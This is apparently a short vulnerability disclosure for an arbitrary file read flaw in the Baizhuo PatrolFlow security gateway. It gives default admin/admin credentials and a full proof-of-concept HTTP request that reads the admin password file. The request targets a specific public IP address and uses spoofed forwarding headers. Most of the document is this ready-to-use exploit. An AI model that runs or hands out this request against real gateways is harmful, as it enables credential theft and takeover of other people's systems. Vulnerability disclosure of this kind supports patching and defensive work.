Baizhuo Network PatrolFlow Multi Service Security Gateway Intelligent Management Platform Has Arbitrary File Reading Vulnerability

version:PatrolFlow-AM-2530Pro

Route: /log/mailsendview.php

```
账号/密码：admin/admin
```
![image](https://github.com/kpz-wm/cve/assets/65756088/c16c212c-9e39-402f-b473-4a0526d4fee0)




POC

Construct the file parameter by using/boot/phpConfiguration/tb_ Admin.txt, read the login account password. With the account password, you can directly log in to the background or read any file in the system.

```
GET /log/mailsendview.php?file=/boot/phpConfig/tb_admin.txt&type=Sina WebMail HTTP/1.1
Host: 124.192.129.106:8443
Cookie: PHPSESSID=4743c37524a43f4ac23abeed72331bd6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
X-Originating-Ip: 1.1.1.1
X-Remote-Ip: 1.1.1.1
X-Remote-Addr: 1.1.1.1
Te: trailers
Connection: close


```
![image](https://github.com/kpz-wm/cve/assets/65756088/fda9df5b-4325-4c48-b766-ff69c88b3c40)

